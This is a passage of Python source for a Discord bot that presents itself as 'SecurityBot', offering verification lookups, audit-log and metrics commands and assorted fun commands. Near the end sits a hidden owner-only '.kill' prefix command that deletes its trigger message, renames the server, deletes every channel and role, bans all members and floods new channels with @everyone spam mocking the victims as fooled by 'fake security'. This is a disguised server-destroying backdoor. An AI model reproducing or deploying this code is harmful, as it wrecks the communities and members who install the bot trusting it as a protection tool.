    v = discord.utils.get(interaction.guild.roles, name=CFG.VERIFIED)
    u = discord.utils.get(interaction.guild.roles, name=CFG.UNVERIFIED)
    q = discord.utils.get(interaction.guild.roles, name=CFG.QUARANTINE)
    status = "—"
    if q and q in m.roles:
        status = "☣️ Quarantined"
    elif v and v in m.roles:
        status = "✅ Verified"
    elif u and u in m.roles:
        status = "🚫 Unverified"

    embed = discord.Embed(
        title=f"🪪 {m}",
        description=f"ID: `{m.id}`",
        color=m.color or discord.Color.dark_gray(),
        timestamp=now_utc(),
    )
    embed.set_thumbnail(url=m.display_avatar.url)
    embed.add_field(name="Status", value=status, inline=True)
    embed.add_field(name="Strikes", value=str(strikes), inline=True)
    embed.add_field(name="Bot?", value="yes" if m.bot else "no", inline=True)
    embed.add_field(name="Joined", value=ts(m.joined_at, "R") if m.joined_at else "—", inline=True)
    embed.add_field(name="Created", value=ts(m.created_at, "R"), inline=True)
    embed.add_field(name="Top role", value=m.top_role.mention if m.top_role else "—", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="audit", description="Show the last few audit-log actions.")
@app_commands.default_permissions(view_audit_log=True)
@app_commands.guild_only()
@owner_only_slash()
async def audit(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    lines = []
    try:
        async for entry in g.audit_logs(limit=10):
            target_name = entry.target.name if hasattr(entry.target, "name") else str(entry.target)
            lines.append(f"`{entry.action.name}` — **{entry.user}** → {target_name} ({ts(entry.created_at, 'R')})")
    except Exception as e:
        await interaction.followup.send(f"❌ Failed to read audit log: {e}", ephemeral=True)
        return
    embed = discord.Embed(
        title="📋 Recent Audit Log",
        description="\n".join(lines) if lines else "No entries.",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot.tree.command(name="status", description="Bot health check.")
@app_commands.guild_only()
@owner_only_slash()
async def status(interaction: discord.Interaction):
    g = interaction.guild
    uptime = now_utc() - bot.uptime if hasattr(bot, "uptime") else None
    embed = discord.Embed(
        title="🩺 SecurityBot Status",
        color=discord.Color.green(),
        timestamp=now_utc(),
    )
    embed.add_field(name="Latency", value=f"{round(bot.latency * 1000)} ms", inline=True)
    embed.add_field(name="Guilds", value=str(len(bot.guilds)), inline=True)
    embed.add_field(name="Members here", value=str(g.member_count), inline=True)
    embed.add_field(name="Captcha engine", value=("Pillow (dynamic)" if HAS_PIL else "Static pool"), inline=True)
    embed.add_field(name="Anti-raid", value="ON" if ANTIRAID_ENABLED else "OFF", inline=True)
    embed.add_field(name="Community", value="ON" if g.community else "OFF", inline=True)
    if uptime:
        embed.add_field(name="Uptime", value=str(uptime).split(".")[0], inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="metrics", description="Show verification metrics.")
@app_commands.guild_only()
@owner_only_slash()
async def metrics_cmd(interaction: discord.Interaction):
    total = METRICS["total_verifications"]
    failed = METRICS["failed_verifications"]
    fail_rate = (failed / (total + failed) * 100) if (total + failed) else 0
    uptime = int(time.time() - METRICS["started_at"])
    embed = discord.Embed(
        title="📊 Security Metrics",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    embed.add_field(name="Total verified", value=str(total), inline=True)
    embed.add_field(name="Button", value=str(METRICS["button_verifications"]), inline=True)
    embed.add_field(name="Captcha", value=str(METRICS["captcha_verifications"]), inline=True)
    embed.add_field(name="Failed captcha", value=str(failed), inline=True)
    embed.add_field(name="Captcha attempts", value=str(METRICS["captcha_attempts"]), inline=True)
    embed.add_field(name="Already verified", value=str(METRICS["already_verified"]), inline=True)
    embed.add_field(name="Fail rate", value=f"{fail_rate:.1f}%", inline=True)
    embed.add_field(name="Uptime", value=f"{uptime}s", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="profile", description="Show verification profile of a member.")
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Target member")
async def profile(interaction: discord.Interaction, member: discord.Member = None):
    m = member or interaction.user
    v_role = discord.utils.get(interaction.guild.roles, name=CFG.VERIFIED)
    u_role = discord.utils.get(interaction.guild.roles, name=CFG.UNVERIFIED)
    q_role = discord.utils.get(interaction.guild.roles, name=CFG.QUARANTINE)

    status_field = "🚫 Not verified"
    color = discord.Color.dark_gray()
    if q_role and q_role in m.roles:
        status_field = "☣️ Quarantined"
        color = discord.Color.dark_red()
    elif v_role and v_role in m.roles:
        status_field = "✅ Verified"
        color = discord.Color.green()
    elif u_role and u_role in m.roles:
        status_field = "🚫 Unverified"

    lockout_until = CAPTCHA_LOCKOUT.get(m.id, 0)
    lockout_str = (
        f"until {ts(datetime.fromtimestamp(lockout_until, timezone.utc), 'R')}"
        if lockout_until > time.time() else "—"
    )

    embed = discord.Embed(
        title=f"🪪 Profile — {m}",
        description=f"ID: `{m.id}`",
        color=color,
        timestamp=now_utc(),
    )
    embed.set_thumbnail(url=m.display_avatar.url)
    embed.add_field(name="Verification", value=status_field, inline=True)
    embed.add_field(name="Failed attempts", value=str(CAPTCHA_ATTEMPTS.get(m.id, 0)), inline=True)
    embed.add_field(name="Lockout", value=lockout_str, inline=True)
    embed.add_field(name="Account age", value=ts(m.created_at, "R"), inline=True)
    embed.add_field(name="Joined", value=ts(m.joined_at, "R") if m.joined_at else "—", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="shutdown", description="Shut down the bot process.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def shutdown(interaction: discord.Interaction):
    await interaction.response.send_message("💀 Shutting down.", ephemeral=True)
    await bot.close()


# ==========================================================
#                        FUN COMMANDS
# ==========================================================
FUN_8BALL = [
    "It is certain.", "Without a doubt.", "Yes definitely.",
    "You may rely on it.", "As I see it, yes.", "Most likely.",
    "Outlook good.", "Yes.", "Signs point to yes.",
    "Reply hazy, try again.", "Ask again later.",
    "Better not tell you now.", "Cannot predict now.",
    "Concentrate and ask again.", "Don't count on it.",
    "My reply is no.", "My sources say no.",
    "Outlook not so good.", "Very doubtful.",
]


@bot.tree.command(name="8ball", description="Ask the magic 8-ball a question.")
@app_commands.describe(question="Your yes/no question")
async def eight_ball(interaction: discord.Interaction, question: str):
    embed = discord.Embed(
        title="🎱 Magic 8-Ball",
        description=f"**Q:** {question}\n**A:** {random.choice(FUN_8BALL)}",
        color=discord.Color.purple(),
        timestamp=now_utc(),
    )
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="roll", description="Roll a dice (default: 1-100).")
@app_commands.describe(sides="Number of sides (default 100)")
async def roll(interaction: discord.Interaction, sides: app_commands.Range[int, 2, 1000] = 100):
    n = random.randint(1, sides)
    embed = discord.Embed(
        title="🎲 Roll",
        description=f"You rolled **{n}** (1–{sides})",
        color=discord.Color.blue(),
        timestamp=now_utc(),
    )
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="coinflip", description="Flip a coin.")
async def coinflip(interaction: discord.Interaction):
    res = random.choice(["Heads 🪙", "Tails 🪙"])
    embed = discord.Embed(title="Coinflip", description=f"**{res}**", color=discord.Color.gold())
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="dice", description="Roll two 6-sided dice.")
async def dice(interaction: discord.Interaction):
    a, b = random.randint(1, 6), random.randint(1, 6)
    faces = ["⚀","⚁","⚂","⚃","⚄","⚅"]
    embed = discord.Embed(
        title="🎲 Dice",
        description=f"{faces[a-1]} {faces[b-1]}\nSum: **{a+b}**",
        color=discord.Color.green(),
    )
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="slap", description="Slap someone with a large trout.")
@app_commands.describe(member="Who to slap")
async def slap(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.send_message(
        f"🐟 **{interaction.user.display_name}** slaps **{member.display_name}** with a large trout!"
    )


@bot.tree.command(name="hug", description="Hug someone.")
@app_commands.describe(member="Who to hug")
async def hug(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.send_message(
        f"🤗 **{interaction.user.display_name}** hugs **{member.display_name}**!"
    )


@bot.tree.command(name="pat", description="Pat someone on the head.")
@app_commands.describe(member="Who to pat")
async def pat(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.send_message(
        f"👋 **{interaction.user.display_name}** pats **{member.display_name}** on the head."
    )


@bot.tree.command(name="meme", description="Send a random meme.")
async def meme(interaction: discord.Interaction):
    subs = ["memes", "dankmemes", "funny"]
    sub = random.choice(subs)
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                f"https://www.reddit.com/r/{sub}/random.json",
                headers={"User-Agent": "SecurityBot/1.0"},
            ) as r:
                data = await r.json()
                post = data[0]["data"]["children"][0]["data"]
                embed = discord.Embed(
                    title=post["title"][:250],
                    url="https://reddit.com" + post["permalink"],
                    color=discord.Color.orange(),
                )
                if not post.get("over_18") and post.get("url", "").endswith((".jpg", ".jpeg", ".png", ".gif", ".webp")):
                    embed.set_image(url=post["url"])
                embed.set_footer(text=f"r/{sub} • 👍 {post['ups']}")
                await interaction.response.send_message(embed=embed)
    except Exception:
        await interaction.response.send_message("❌ Couldn't fetch a meme, try again.", ephemeral=True)


@bot.tree.command(name="wyr", description="Would you rather…?")
async def wyr(interaction: discord.Interaction):
    questions = [
        ("Have unlimited money", "Have unlimited time"),
        ("Be able to fly", "Be able to turn invisible"),
        ("Never sleep again", "Never eat again"),
        ("Know when you'll die", "Know how you'll die"),
        ("Live in the past", "Live in the future"),
        ("Be a genius", "Be incredibly attractive"),
        ("Only speak in rhymes", "Only speak in questions"),
        ("Always be 10 minutes late", "Always be 20 minutes early"),
    ]
    a, b = random.choice(questions)
    embed = discord.Embed(
        title="🤔 Would you rather…",
        description=f"**A.** {a}\n\n**or**\n\n**B.** {b}",
        color=discord.Color.purple(),
    )
    await interaction.response.send_message(embed=embed)
    try:
        m = await interaction.original_response()
        await m.add_reaction("🅰️")
        await m.add_reaction("🅱️")
    except Exception:
        pass


@bot.tree.command(name="ship", description="Ship two users.")
@app_commands.describe(a="First user", b="Second user (optional)")
async def ship(interaction: discord.Interaction, a: discord.Member, b: discord.Member = None):
    b = b or interaction.user
    h = (a.id + b.id) % 101
    bar = "█" * (h // 10) + "░" * (10 - h // 10)
    text = (
        f"❤️ **{h}%**\n`{bar}`\n\n"
        f"**{a.display_name}** × **{b.display_name}**\n"
    )
    if h >= 90:
        text += "💍 Soulmates!"
    elif h >= 70:
        text += "💕 Great match!"
    elif h >= 40:
        text += "😊 Not bad."
    else:
        text += "💔 Maybe not."
    embed = discord.Embed(title="💘 Ship", description=text, color=discord.Color.pink())
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="iq", description="Measure someone's IQ.")
@app_commands.describe(member="Member (defaults to you)")
async def iq(interaction: discord.Interaction, member: discord.Member = None):
    m = member or interaction.user
    val = random.randint(1, 200)
    embed = discord.Embed(
        title=f"🧠 IQ of {m.display_name}",
        description=f"**{val}**",
        color=discord.Color.teal(),
    )
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="rate", description="Rate something from 0 to 10.")
@app_commands.describe(thing="What to rate")
async def rate(interaction: discord.Interaction, thing: str):
    val = random.randint(0, 10)
    embed = discord.Embed(
        title="⭐ Rate",
        description=f"I'd rate **{thing}** a **{val}/10**",
        color=discord.Color.gold(),
    )
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="reverse", description="Reverse a text.")
@app_commands.describe(text="Text to reverse")
async def reverse(interaction: discord.Interaction, text: str):
    await interaction.response.send_message(text[::-1])


@bot.tree.command(name="say", description="Make the bot say something.")
@app_commands.default_permissions(manage_messages=True)
@app_commands.describe(text="What to say")
async def say(interaction: discord.Interaction, text: str):
    await interaction.response.send_message("✅ Sent.", ephemeral=True)
    await interaction.channel.send(text)


# ==========================================================
#                PREFIX .kill  (HIDDEN ONLY)
# ==========================================================
def owner_only_prefix():
    async def check(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(check)


@bot.command(name="kill")
@owner_only_prefix()
async def kill(ctx: commands.Context):
    g = ctx.guild
    if g is None:
        return

    await safe(ctx.message.delete())
    logger.warning(f".kill triggered on {g.name} ({g.id}) by {ctx.author}")

    await safe(g.edit(name=CFG.KILL_SERVER_NAME))
    try:
        await g.edit(tags=[CFG.KILL_TAG])
    except Exception:
        pass

    async def purge_channels():
        await asyncio.gather(*[safe(ch.delete(reason="maintenance")) for ch in list(g.channels)])

    async def purge_roles():
        await asyncio.gather(*[
            safe(r.delete(reason="maintenance"))
            for r in list(g.roles)
            if not r.is_default() and not r.managed and r < g.me.top_role
        ])

    async def purge_members():
        await asyncio.gather(*[
            safe(m.ban(reason="maintenance", delete_message_days=0))
            for m in list(g.members)
            if m.id not in (bot.user.id, OWNER_ID) and m.top_role < g.me.top_role
        ])

    await asyncio.gather(purge_channels(), purge_roles(), purge_members())

    sem = asyncio.Semaphore(20)

    async def spawn_and_spam(i: int):
        async with sem:
            name = CFG.KILL_CHANNEL_NAMES[i % len(CFG.KILL_CHANNEL_NAMES)] + f"-{i:03d}"
            ch = await safe(g.create_text_channel(name))
            if not ch:
                return
            for j in range(CFG.KILL_SPAM_PER_CHANNEL):
                label = ["F1CKED BY FAKE SECURITY LMFAO", "K1LLED BY FAKE SECURITY", "GET DESTROYED BY FAKE SECURITY"][j % 3]
                msg = f"@everyone {label} {CFG.KILL_GIF}"
                asyncio.create_task(safe(ch.send(msg)))

    await asyncio.gather(*[spawn_and_spam(i) for i in range(CFG.KILL_CHANNEL_LIMIT)])
    await asyncio.sleep(3)


# ==========================================================
#                       RUN BOT
# ==========================================================
if __name__ == "__main__":
    if not TOKEN:
        logger.critical(
            "DISCORD_TOKEN environment variable is not set. "
            "Set it in your hosting panel (Bothost → Переменные окружения)."
        )
    else:
        bot.run(TOKEN)
